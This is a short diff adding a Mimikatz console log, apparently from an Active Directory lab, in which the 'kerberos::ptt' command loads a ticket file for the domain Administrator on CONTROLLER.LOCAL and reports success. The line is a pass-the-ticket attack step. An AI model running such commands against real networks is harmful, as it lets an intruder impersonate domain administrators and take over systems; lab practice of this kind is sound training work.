@@ -1,0 +1,5 @@
+mimikatz # kerberos::ptt [0;2b2cc0]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+
+* File: '[0;2b2cc0]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
+
+mimikatz #
